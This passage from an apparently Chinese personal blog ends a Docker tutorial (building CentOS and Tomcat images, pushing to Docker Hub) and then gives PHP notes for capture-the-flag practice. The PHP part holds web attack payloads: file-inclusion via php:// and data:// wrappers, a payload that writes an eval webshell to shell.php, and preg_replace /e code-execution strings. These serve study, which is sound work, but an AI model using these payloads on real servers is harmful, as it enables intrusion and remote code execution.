<p>​	编写的dockerfile文件和上面一样，将 CMD 换成 ENTRYPOINT 即可，构建好镜像后，如上面测试时一样追加一个参数 <code>-l</code> ，命令可以执行，说明追加命令直接拼接在 ENTRYPOINT 命令后面</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@root test]# docker build -f test_entrypoint .</span><br><span class="line">Sending build context to Docker daemon  4.096kB</span><br><span class="line">…………</span><br><span class="line">Successfully built c6573fd50089</span><br><span class="line">[root@root test]# docker run  c6573fd50089 -l</span><br><span class="line">total 64</span><br><span class="line">drwxr-xr-x   1 root root  4096 Feb 15 11:52 .</span><br><span class="line">drwxr-xr-x   1 root root  4096 Feb 15 11:52 ..</span><br><span class="line">-rwxr-xr-x   1 root root     0 Feb 15 11:52 .dockerenv</span><br><span class="line">-rw-r--r--   1 root root 12114 Nov 13  2020 anaconda-post.log</span><br><span class="line">………………</span><br></pre></td></tr></table></figure>

<h3 id="查看本地镜像变更历史"><a href="#查看本地镜像变更历史" class="headerlink" title="查看本地镜像变更历史"></a>查看本地镜像变更历史</h3><p>可以用 <code>docker history 镜像ID</code> 查看镜像的创建过程</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@root test]# docker history fd615d6ff973</span><br><span class="line">IMAGE               CREATED             CREATED BY                                      SIZE                COMMENT</span><br><span class="line">fd615d6ff973        26 minutes ago      /bin/sh -c #(nop)  CMD [&quot;/bin/sh&quot; &quot;-c&quot; &quot;/bin…   0B                  </span><br><span class="line">80097bd57eb6        26 minutes ago      /bin/sh -c #(nop)  CMD [&quot;/bin/sh&quot; &quot;-c&quot; &quot;echo…   0B                  </span><br><span class="line">e2ce79d8de03        26 minutes ago      /bin/sh -c #(nop)  EXPOSE 80                    0B                  </span><br><span class="line">ca3bd3fc8264        26 minutes ago      /bin/sh -c yum -y install net-tools             199MB               </span><br><span class="line">8a9aaca756cf        26 minutes ago      /bin/sh -c yum -y install vim                   254MB               </span><br><span class="line">8120bc59003d        26 minutes ago      /bin/sh -c #(nop) WORKDIR /usr/local            0B                  </span><br><span class="line">8741afe6768e        26 minutes ago      /bin/sh -c #(nop)  ENV MYPATH=/usr/local        0B                  </span><br><span class="line">59148671933a        26 minutes ago      /bin/sh -c #(nop)  MAINTAINER nikaido&lt;158128…   0B                  </span><br><span class="line">eeb6ee3f44bd        17 months ago       /bin/sh -c #(nop)  CMD [&quot;/bin/bash&quot;]            0B                  </span><br><span class="line">&lt;missing&gt;           17 months ago       /bin/sh -c #(nop)  LABEL org.label-schema.sc…   0B                  </span><br><span class="line">&lt;missing&gt;           17 months ago       /bin/sh -c #(nop) ADD file:b3ebbe8bd304723d4…   204MB               </span><br></pre></td></tr></table></figure>

<h2 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h2><h3 id="制作自己的centos镜像"><a href="#制作自己的centos镜像" class="headerlink" title="制作自己的centos镜像"></a>制作自己的centos镜像</h3><p>​	这个是官方的centos制作镜像的dockerfile文件，Docker Hub中大多数镜像都是基于scatch开发的(是一个基础镜像)</p>
<p><img src="https://cdn.staticaly.com/gh/Nikaid0/Imge/main/photo/000-00N/003/docker-19.png" alt="docker-19"></p>
<p>制作一个自己的centos(添加 vim、net-tools 命令)</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">FROM centos:7				# 基于centos7的基础镜像</span><br><span class="line">MAINTAINER nikaido&lt;1581283149@qq.com&gt;</span><br><span class="line"></span><br><span class="line">ENV MYPATH /usr/local		# 定义环境变量MYPATH</span><br><span class="line">WORKDIR $MYPATH				# 定义工作目录</span><br><span class="line"></span><br><span class="line">RUN yum -y install vim</span><br><span class="line">RUN yum -y install net-tools</span><br><span class="line"></span><br><span class="line">EXPOSE 80					# 暴露80端口</span><br><span class="line"></span><br><span class="line">CMD echo $MYPATH</span><br><span class="line">CMD /bin/bash				# 使用/bin/bash终端</span><br></pre></td></tr></table></figure>

<p>用 <code>docker build</code> 构建镜像 nikaido:0.0 <strong>(不要忘记后面的 <code>.</code> )</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker build -f test_centos -t nikaido:0.0 .</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">-f dockerfile文件路径</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">-t 镜像名:[tag]</span></span><br></pre></td></tr></table></figure>

<p>测试运行一下</p>
<p><img src="https://cdn.staticaly.com/gh/Nikaid0/Imge/main/photo/000-00N/003/docker-18.jpg" alt="docker-18"></p>
<h3 id="制作Tomcat镜像"><a href="#制作Tomcat镜像" class="headerlink" title="制作Tomcat镜像"></a>制作Tomcat镜像</h3><ul>
<li><p>准备好 Tomcat 的压缩包，因为Tomcat是依赖于java的，所以还需要 jdk 的压缩包</p>
<p><img src="https://cdn.staticaly.com/gh/Nikaid0/Imge/main/photo/000-00N/003/docker-20.jpg" alt="docker-20"></p>
</li>
<li><p>编写dockerfile文件，官方命名 <code>Dockerfile</code> （build时会自动寻找这个文件，不需要 <code>-f</code> 指定）</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">照葫芦画瓢的</span></span><br><span class="line">FROM centos:7</span><br><span class="line">MAINTAINER nikaido&lt;1581283149@qq.com&gt;</span><br><span class="line"></span><br><span class="line">ADD jdk-8u151-linux-x64.tar.gz  /usr/local/</span><br><span class="line">ADD apache-tomcat-9.0.71.tar.gz /usr/local/</span><br><span class="line"></span><br><span class="line">RUN yum -y install vim</span><br><span class="line"></span><br><span class="line">ENV MYPATH /usr/local/</span><br><span class="line">WORKDIR $MYPATH</span><br><span class="line"></span><br><span class="line">ENV JAVA_HOME /usr/local/jdk1.8.0_151</span><br><span class="line">ENV CLASSPATH JAVA_HOME/lib/dt.jar:JAVA_HOME/lib/tools.jar</span><br><span class="line">ENV TOM_HOME /usr/local/apache-tomcat-9.0.71</span><br><span class="line">ENV TOM_BASH /usr/local/apache-tomcat-9.0.71</span><br><span class="line">ENV PATH $PATH:$JAVA_HOME/bin:$TOM_HOME/lib:$TOM_HOME/bin</span><br><span class="line"> </span><br><span class="line">EXPOSE 8080</span><br><span class="line"> </span><br><span class="line">CMD /usr/local/apache-tomcat-9.0.71/bin/startup.sh &amp;&amp; tail -F /usr/local/apache-tomcat-9.0.71/bin/logs/catalina.out</span><br></pre></td></tr></table></figure>
</li>
<li><p><code>docker build -t testtomcat .</code> 构建镜像成功后，直接运行<del>（挂载什么的太麻烦了~这里就不挂了）</del>，用浏览器测试一下访问成功</p>
</li>
</ul>
  <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@root test]# docker run -d -p 3389:8080 testtomcat</span><br></pre></td></tr></table></figure>

<p>  <img src="https://cdn.staticaly.com/gh/Nikaid0/Imge/main/photo/000-00N/003/docker-21.jpg" alt="docker-21"></p>
<h2 id="发布镜像到DockerHub"><a href="#发布镜像到DockerHub" class="headerlink" title="发布镜像到DockerHub"></a>发布镜像到DockerHub</h2><ol>
<li><p>首先要注册一个可以登录的账号</p>
</li>
<li><p>在主机通过命令行登录docker</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@root test]# docker login --help</span><br><span class="line"></span><br><span class="line">Usage:	docker login [OPTIONS] [SERVER]</span><br><span class="line"></span><br><span class="line">Log in to a Docker registry</span><br><span class="line"></span><br><span class="line">Options:</span><br><span class="line">  -p, --password string   Password</span><br><span class="line">      --password-stdin    Take the password from stdin</span><br><span class="line">  -u, --username string   Usernam</span><br><span class="line"><span class="meta prompt_">  </span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">登录</span></span><br><span class="line">docker login -u 用户名</span><br></pre></td></tr></table></figure>
</li>
<li><p>登陆完就可以用 <code>docker push</code>命令 提交镜像了，<code>docker logout</code> 登出用户</p>
</li>
</ol>
<blockquote>
<p>格式：docker push 用户名&#x2F;镜像名:tag</p>
</blockquote>
<p>直接 <code>push</code> 会被拒绝 </p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@root test]# docker push testtomcat</span><br><span class="line">The push refers to repository [docker.io/library/testtomcat]</span><br><span class="line">06e882770dce: Preparing </span><br><span class="line">e0c442ed4b6b: Preparing </span><br><span class="line">6cb9ad15625b: Preparing </span><br><span class="line">174f56854903: Preparing </span><br><span class="line">denied: requested access to the resource is denied</span><br></pre></td></tr></table></figure>

<p>解决方法：使用 <code>docker tag</code> 命令修改镜像的版本和名字再重新上传</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@root test]# docker tag 4f7712a34ee4 nik5d0/testtomcat:1.0</span><br><span class="line">[root@root test]# docker push nik5d0/testtomcat:1.0</span><br><span class="line">The push refers to repository [docker.io/nik5d0/testtomcat]</span><br><span class="line">06e882770dce: Pushing [==&gt;                                                ]   12.5MB/253.7MB</span><br><span class="line">e0c442ed4b6b: Pushing [===================&gt;                               ]  6.343MB/16.15MB</span><br><span class="line">6cb9ad15625b: Pushing [&gt;                                                  ]  7.081MB/384.4MB</span><br><span class="line">174f56854903: Pushing [===&gt;                                               ]  12.53MB/203.9MB</span><br></pre></td></tr></table></figure>

<h2 id="Docker全流程"><a href="#Docker全流程" class="headerlink" title="Docker全流程"></a>Docker全流程</h2><p><img src="https://cdn.staticaly.com/gh/Nikaid0/Imge/main/photo/000-00N/003/docker-22.png" alt="docker-22"></p>
<p>docker save 和docker load 可以将镜像输出和导入(以文件的形式)</p>
]]></content>
      <categories>
        <category>炼气</category>
      </categories>
      <tags>
        <tag>基础</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP-杂七杂八</title>
    <url>/2022/11/21/002&amp;102%E2%80%94PHP(%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB)/</url>
    <content><![CDATA[<h1 id="PHP伪协议-文件包含漏洞"><a href="#PHP伪协议-文件包含漏洞" class="headerlink" title="PHP伪协议-文件包含漏洞"></a>PHP伪协议-文件包含漏洞</h1><p>​	PHP伪协议是 PHP支持的协议 与 封装协议，使用条件：具有文件包含的函数，如 include()、require()、include_once()、require_once()</p>
<p>​	PHP中有很多函数可以查看源码：<code>highlight_file()</code>  、<code>show_source()</code>、<code>readfile()</code> <code>file_get_contents()</code>（无回显，需要手动输出）</p>
<h2 id="file-x2F-x2F"><a href="#file-x2F-x2F" class="headerlink" title="file:&#x2F;&#x2F;"></a>file:&#x2F;&#x2F;</h2><p>​	用来读取本地文件，不受 <code>php.ini</code> 配置文件中 <code>allow_url_fopen</code>，<code>allow_url_include</code> 的限制</p>
<blockquote>
<p>用法：&#x2F;?file&#x3D;file:&#x2F;&#x2F;文件的绝对路径+文件名</p>
</blockquote>
<p>​	如果要读取的是 <code>.php</code> 文件时，代码会自动执行而看到不到源码(与下面的php:&#x2F;&#x2F;filter一样，要看源码的话只能先编码了)。<del>第一个 file 是定义的变量，不一定都是 file</del></p>
<h2 id="php-x2F-x2F"><a href="#php-x2F-x2F" class="headerlink" title="php:&#x2F;&#x2F;"></a>php:&#x2F;&#x2F;</h2><blockquote>
<p>仅php:&#x2F;&#x2F;input、php:&#x2F;&#x2F;stdin、php:&#x2F;&#x2F;memory 和 php:&#x2F;&#x2F;temp 需要开启allow_url_include</p>
</blockquote>
<p>​	访问各个输入&#x2F;输出流，在CTF中用 php:&#x2F;&#x2F;filter读取源码，php:&#x2F;&#x2F;input执行php代码</p>
<h3 id="php-x2F-x2F-filter"><a href="#php-x2F-x2F-filter" class="headerlink" title="php:&#x2F;&#x2F;filter"></a><strong>php:&#x2F;&#x2F;filter</strong></h3><p>​	访问本地文件的协议，读取源码时要进行base64编码，不然会被当做 php 代码执行而看不到源码</p>
<blockquote>
<p>&#x2F;?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php</p>
</blockquote>
<ol>
<li>php:&#x2F;&#x2F;filter&#x2F;:格式</li>
<li>read:可选参数，有 read write 也可以不写</li>
<li>convert.base64-encode:可选，转换过滤器</li>
<li>&#x2F;resource&#x3D;：必选，后面加目标文件名</li>
</ol>
<p>过滤器:字符串过滤器，转换过滤器，压缩过滤器，加密过滤器。使用多个过滤器时用 | 分割开</p>
<table>
<thead>
<tr>
<th>字符串过滤器</th>
<th>作用</th>
</tr>
</thead>
<tbody><tr>
<td>string.rot13</td>
<td>等同于 str_rot13()，rot13变换</td>
</tr>
<tr>
<td>string.toupper</td>
<td>等同于 strtoupper()，转大写字母</td>
</tr>
<tr>
<td>string.tolower</td>
<td>等同于 strtolower()，转小写字母</td>
</tr>
<tr>
<td>string.strip_tags</td>
<td>等同于 strip_tags()，去除字符串中HTML、XML、PHP的语言标签</td>
</tr>
</tbody></table>
<p><strong>转换过滤器</strong></p>
<p>​	convert.base64-encode：base64编码，convert.base64-decode：  base64解码</p>
<p>​	convert.quoted-printable-encode：Quoted-printable编码，convert.quoted-printable-decode：解码</p>
<p><strong>加密过滤器</strong></p>
<p>​	<code>mcrypt.*</code>：libmcrypt 对称加密算法，<code>mdecrypt.*</code>：libmcrypt 对称解密算法</p>
<p><strong>[ACTF2020 新生赛]Include：</strong></p>
<p><img src="https://cdn.staticaly.com/gh/Nikaid0/Imge/main/photo/000-00N/002/002-php-01.jpg"></p>
<h3 id="php-x2F-x2F-input"><a href="#php-x2F-x2F-input" class="headerlink" title="php:&#x2F;&#x2F;input"></a><strong>php:&#x2F;&#x2F;input</strong></h3><p>​	条件：开启allow_url_include、同样源码中要有 文件包含 的函数</p>
<blockquote>
<p>用法：&#x2F;?file&#x3D;php:&#x2F;&#x2F;input，之后在用 POST的方式输入 代码</p>
</blockquote>
<p>​	可以访问请求原始数据的只读流，将 POST 请求的数据当作php代码执行。将参数设为 php:&#x2F;&#x2F;input，同时用 POST 方式输入想要执行的代码，从而导致任意代码的执行</p>
<p>利用 php:&#x2F;&#x2F;input 可以写入 PHP一句话木马，在 POST 中传入如下代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">fputs</span>(<span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;shell.php&#x27;</span>,<span class="string">&#x27;w&#x27;</span>),<span class="string">&#x27;&lt;?php @eval($_POST[pass])?&gt;&#x27;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="zip-x2F-x2F"><a href="#zip-x2F-x2F" class="headerlink" title="zip:&#x2F;&#x2F;"></a>zip:&#x2F;&#x2F;</h2><blockquote>
<p>方法：&#x2F;?file&#x3D;zip:&#x2F;&#x2F;压缩文件绝对路径 %23 压缩包内的文件名</p>
</blockquote>
<p>可以访问 压缩包 里面的文件，当与包含函数结合时，zip:&#x2F;&#x2F; 流会被当作 PHP 执行，从而实现任意代码执行</p>
<ul>
<li>压缩文件的后缀名可以任意修改，只要是压缩包即可(如果.zip无法上传，可以上传.jpg)</li>
<li>%23 为 # 的URL编码，因为在 GET 请求中会 忽略 # 后面的参数</li>
<li>相同类型：zlib:&#x2F;&#x2F;、bzip2:&#x2F;&#x2F;</li>
</ul>
<p><img src="https://cdn.staticaly.com/gh/Nikaid0/Imge/main/photo/000-00N/002/002-php-02.jpg"></p>
<h2 id="data-x2F-x2F"><a href="#data-x2F-x2F" class="headerlink" title="data:&#x2F;&#x2F;"></a>data:&#x2F;&#x2F;</h2><blockquote>
<p>条件：allow_url_fopen、allow_url_include 都为 On</p>
</blockquote>
<p>用法：&#x2F;?file&#x3D;data:&#x2F;&#x2F; [MIME-TYPE] [;charset&#x3D;encoding] [;base64], 想要执行的代码</p>
<p>​	类似于 php:&#x2F;&#x2F;input，可以让用户来控制输入流，当它与包含函数结合时，用户输入的<code>data://</code>流会被当作php文件执行，从而导致任意代码执行</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">data:<span class="comment">//text/plain,</span></span><br><span class="line">data:<span class="comment">//text/plain;base64,</span></span><br><span class="line">	/?file=data:<span class="comment">//,&lt;?php phpinfo()?&gt;</span></span><br><span class="line">	/?file=data:<span class="comment">//text/plain,&lt;?php phpinfo()?&gt;</span></span><br><span class="line">    /?file=data:text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.staticaly.com/gh/Nikaid0/Imge/main/photo/000-00N/002/002-php-03.png"></p>
<p>**phar:&#x2F;&#x2F;**：与 zip:&#x2F;&#x2F; 类似，可以导致 任意代码的执行，用法一样</p>
<h2 id="file-get-contents-绕过"><a href="#file-get-contents-绕过" class="headerlink" title="file_get_contents 绕过"></a><strong>file_get_contents 绕过</strong></h2><p>​	file_get_contents()：把整个文件读入一个 字符串中</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//test.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">    <span class="variable">$a</span>= <span class="variable">$_GET</span>[<span class="string">&quot;a&quot;</span>];</span><br><span class="line">    <span class="keyword">if</span>((<span class="keyword">isset</span>(<span class="variable">$a</span>))&amp;&amp;(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$a</span>,<span class="string">&#x27;r&#x27;</span>)) === <span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;success\n&quot;</span>;	</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//flag.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="variable">$flag</span>=<span class="string">&#x27;flag&#123;congratulation!&#125;&#x27;</span>;    </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>​	可以用 php:&#x2F;&#x2F;input得到原始的POST数据，访问请求的原始数据的只读流。将 POST 请求中的数据作为PHP代码执行来进行绕过；还可以用 data:&#x2F;&#x2F; 来控制输入流</p>
<ul>
<li><p>将 <code>flag</code> 这个字符串 用POST的方式传进去(当然还要用&#x2F;?a&#x3D;php:&#x2F;&#x2F;input)</p>
</li>
<li><p>还可以用 <code>/?a=data://text/plain,flag</code></p>
</li>
</ul>
<h1 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h1><p>​	我们用 <code>$</code> + 变量名(当然名字需要合法) 来表示变量</p>
<ul>
<li><p><strong>全局变量</strong>：在所有函数外定义的变量，拥有 <strong>全局</strong> 作用域</p>
</li>
<li><p><strong>局部变量</strong>：仅在一个函数内部定义的变量，只有 <strong>局部</strong> 作用域</p>
</li>
<li><p><strong>超级全局变量</strong>：PHP中预定义了一些数组变量，可以在任何位置访问（同时拥有 局部和全局 作用域）</p>
</li>
</ul>
<p>​	在一个函数中是无法访问 <strong>全局变量</strong>的(除非声明变量为 global )，同样在一个函数中定义的<strong>局部变量</strong> <u>函数外</u> 也无法访问，也就是说在不同函数内可以使用相同的变量名(都是局部变量)</p>
<p>以下是一些超级全局变量</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$GLOBALS</span></span><br><span class="line"><span class="variable">$_SERVER</span>:一个包含了头信息、路径、以及脚本位置等信息的数组</span><br><span class="line"><span class="variable">$_REQUEST</span>:默认情况下包含了 <span class="variable">$_GET</span> <span class="variable">$_POST</span> <span class="variable">$_SESSION</span>的数组</span><br><span class="line"><span class="variable">$_GET</span>:收集HTML表单数据</span><br><span class="line"><span class="variable">$_POST</span>:同上，但更安全</span><br><span class="line"><span class="variable">$_SESSION</span>:用于记住用户的状态 和 他想要在整个会话中检索的值</span><br><span class="line"><span class="variable">$_COOKIE</span>:通过 HTTP Cookies方式传递给当前脚本的变量的数组</span><br><span class="line"><span class="variable">$_FILES</span>:通过 POST 方法向服务器上传的数据的有关信息的数组</span><br><span class="line"><span class="variable">$_ENV</span></span><br></pre></td></tr></table></figure>

<p>以下是 $_SERVER 的一些元素：</p>
<table>
<thead>
<tr>
<th>参数</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>$_SERVER[‘PHP_SELF’]</td>
<td>当前正在执行的脚本 文件名</td>
</tr>
<tr>
<td>$_SERVER[‘SERVER_ADDR’]</td>
<td>主机服务器的IP地址</td>
</tr>
<tr>
<td>$_SERVER[‘SERVER_NAME’]</td>
<td>主机服务器名</td>
</tr>
<tr>
<td>$_SERVER[‘SERVER_PORT’]</td>
<td>Web 服务器使用的端口</td>
</tr>
<tr>
<td>$_SERVER[‘SCRIPT_FILENAME’]</td>
<td>当前执行脚本的绝对路径</td>
</tr>
<tr>
<td>$_SERVER[ ‘HTTP_USER_AGENT’ ]</td>
<td>客户端的用户代理</td>
</tr>
</tbody></table>
<p>​	$_REQUEST 变量可用来收集通过 GET 和 POST 方法发送的表单信息，但不常用(有安全问题)</p>
<p>​	$_GET 变量用于收集来自 method&#x3D;”get” 的表单中的值，可以在URL中直接看到，变量的值有限制</p>
<p>​	$_POST 变量用于收集来自 method&#x3D;”post” 的表单中的值。用 POST 方法发送的表单信息，对任何人都是不可见的（不会显示在URL中，更安全），且发送信息的量也没有限制</p>
<blockquote>
<p>$_SESSION 数组变量用于存储来自任何页面的值，并在其他页面中检索它们，而不是在URL中传递它们。</p>
</blockquote>
<h1 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h1><p><strong>eval、assert、call_user_func</strong></p>
<ol>
<li><p>eval()：将一段合法的 PHP 字符串当作代码执行（须以 <code>;</code> 结尾，函数调用除外）</p>
</li>
<li><p>assert()：判断一个表达式是否成立，可以把 整个字符串 当做 PHP 代码执行(类似于eval)</p>
</li>
<li><p>call_user_func()：将第一个参数作为回调函数调用（将第一个参数作为函数）</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//命令拼接</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$a</span> = <span class="string">&quot;system&quot;</span>;</span><br><span class="line">    <span class="variable">$b</span> = <span class="string">&quot;ls&quot;</span>;</span><br><span class="line">    <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$a</span>,<span class="variable">$b</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">// 执行定义好的函数</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"><span class="variable">$a</span>,<span class="variable">$b</span></span>)   </span></span><br><span class="line"><span class="function">    </span>&#123;   </span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$a</span>;   </span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$b</span>;   </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">call_user_func</span>(<span class="string">&quot;test&quot;</span>, <span class="string">&quot;111&quot;</span>,<span class="string">&quot;222&quot;</span>); 	<span class="comment">//输出 111222</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="intval-比较绕过"><a href="#intval-比较绕过" class="headerlink" title="intval()比较绕过"></a><strong>intval()比较绕过</strong></h2><blockquote>
<p>适用版本：php7.0以下</p>
</blockquote>
<p>如果参数是科学计数法的字符串，会以e前面的数字作为返回值；而对于科学计数法+数字则会返回其本来的值</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//[WUSTCTF2020]朴实无华-level1</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>) &lt; <span class="number">2020</span> &amp;&amp; <span class="title function_ invoke__">intval</span>(<span class="variable">$num</span> + <span class="number">1</span>) &gt; <span class="number">2021</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;我不经意间看了看我的劳力士, 不是想看时间, 只是想不经意间, 让你知道我过得比你好.&lt;/br&gt;&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;金钱解决不了穷人的本质问题&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;去非洲吧&quot;</span>);</span><br><span class="line">&#125; </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>​	可用利用科学计数法绕过：<strong>num&#x3D;1e10</strong>，但后面的数字不能太大，因为返回值的范围有限</p>
<h2 id="preg-replace-x2F-e模式"><a href="#preg-replace-x2F-e模式" class="headerlink" title="preg_replace() &#x2F;e模式"></a><strong>preg_replace() &#x2F;e模式</strong></h2><blockquote>
<p>preg_replace($pattern , $replacement , $subject)<br>            $pattern：要搜索的模式，可以是字符串或一个字符串数组<br>            $replacement：用于替换的字符串或字符串数组<br>            $subject：目标字符串或字符串数组</p>
<p>&#x2F;e 修正符使 preg_replace() 将 $replacement 参数当作 PHP 代码，但$replacement 必须能构成一个合法的 PHP 代码字符串</p>
</blockquote>
<p><strong>[BJDCTF2020]ZJCTF，不过如此</strong>：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$id</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;id&#x27;</span>] = <span class="variable">$id</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">complex</span>(<span class="params"><span class="variable">$re</span>, <span class="variable">$str</span></span>) </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>( <span class="string">&#x27;/(&#x27;</span> . <span class="variable">$re</span> . <span class="string">&#x27;)/ei&#x27;</span>,<span class="string">&#x27;strtolower(&quot;\\1&quot;)&#x27;</span>,<span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$re</span> =&gt; <span class="variable">$str</span>) </span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">complex</span>(<span class="variable">$re</span>, <span class="variable">$str</span>). <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	@<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><p>&#x2F;e模式：相当于执行了 <code>strtolower(&quot;\\1&quot;)</code>，<code>\\1</code> 也就是 \1，正则表达式中表示 指定第一个子匹配项</p>
</li>
<li><p>$_GET as $re &#x3D;&gt; $str：动态赋值，将GET请求中的 参数名 作为 键$re，参数对应的值 作为键值$str</p>
</li>
</ul>
<p>​	官方payload：&#x2F;?.*&#x3D;{${phpinfo()}}（GET方式传入的参数名为 <code>?.*</code> ，值为 {${phpinfo()}} ）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">原先的语句: preg_replace(&#x27;/(&#x27; . $regex . &#x27;)/ei&#x27;, &#x27;strtolower(&quot;\1&quot;)&#x27;, $value);</span><br><span class="line">变成了语句: preg_replace(&#x27;/(.*)/ei&#x27;, &#x27;strtolower(&quot;\1&quot;)&#x27;, &#123;$&#123;phpinfo()&#125;&#125;);</span><br></pre></td></tr></table></figure>

<p>​	但是，在 PHP 中对于传入的非法的 $_GET 数组参数名，会将其转换成下划线(比如 <code>.</code> )，所以我们要换一个正则表达式，让其匹配到 <strong>{${phpinfo()}}</strong> 即可执行函数。大佬给提供的payload为：<em><em>\S</em>&#x3D;${phpinfo()}</em>*</p>
<p>​	在PHP中双引号包裹的字符串中可以解析变量，而单引号则不行。 <strong>${phpinfo()}</strong> 中的 <strong>phpinfo()</strong> 会被当做变量先执行，执行后，即变成 <strong>${1}</strong></p>
<p>​	利用定义的getFlag函数执行命令：**?\S*&#x3D;${getflag()}&amp;cmd&#x3D;system(‘ls’);** 查找到 flag的位置即可</p>
<p><a href="https://xz.aliyun.com/t/2557">preg_replace与代码执行 </a></p>
<h2 id="basename-绕过正则"><a href="#basename-绕过正则" class="headerlink" title="basename()绕过正则"></a>basename()绕过正则</h2><p>​	basename()：返回路径中的文件名部分，语法：<strong>basename(path,suffix)</strong></p>
<blockquote>
<p>path：必需，规定要检查的路径</p>
<p>suffix：可选，规定文件扩展名（如果文件有 suffix，则不会输出这个扩展名）</p>
</blockquote>
